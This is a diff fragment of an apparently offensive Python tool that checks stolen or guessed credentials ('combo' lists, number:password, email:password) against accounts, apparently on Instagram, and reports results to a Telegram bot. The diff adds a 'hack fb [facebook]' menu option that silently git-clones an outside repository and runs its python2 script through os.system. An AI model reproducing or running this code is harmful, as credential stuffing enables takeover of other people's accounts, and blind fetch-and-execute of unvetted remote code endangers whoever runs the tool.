@@ -125,9 +125,9 @@ elif "y" in tele:
     id = input("[+] ID ==> ")
     bot = input("[+] Token ==> ")
 print(pl)
-tlps = input("""[1] Checker Auto Number:Number\n[2] Checker Number:Pass\n[3] Checker List User + Pass\n[4] Checker E-mail:Pass
+tlps = input("""[1] Checker insta  Auto Number:Number\n[2] Checker Number:Pass\n[3] Checker List User + Pass\n[4] Checker E-mail:Pass
 [5]checker combo
-[6]combo drust krdn ba email hotmail\n===============================\n[÷] Choose ==> """)
+[6]hack fb  [facebook]\n===============================\n[÷] Choose ==> """)
 if tlps == "1":
    
     make = '1234567890'
@@ -700,6 +700,5 @@ if tlps == "5":
         else:
             b+=1    
             print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
-
-
-	
+if tlps == "6":
+        os.system('git clone https://github.com/TURKNNEJDJDJD/RRRRRRRRR.git ; cd RRRRRRRRR ;python2 RR1.py')
